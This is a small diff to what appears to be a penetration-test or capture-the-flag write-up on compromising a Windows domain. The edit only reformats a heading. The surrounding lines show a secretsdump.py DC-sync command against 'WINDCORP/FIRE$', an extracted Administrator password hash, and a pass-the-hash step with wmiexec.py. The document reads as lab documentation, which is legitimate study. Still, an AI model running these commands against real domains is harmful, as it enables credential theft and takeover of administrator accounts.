@@ -106,7 +106,7 @@ bash
 sudo python3 secretsdump.py -no-pass -just-dc 'WINDCORP/FIRE$'@10.64.183.52
 
 ## Extracted Administrator hash: bfa4cae19504e0591ef0a523a1936cd4
-3.3 Administrative Access via Pass-the-Hash
+### 3.3 Administrative Access via Pass-the-Hash
 
 Using wmiexec.py:
 bash
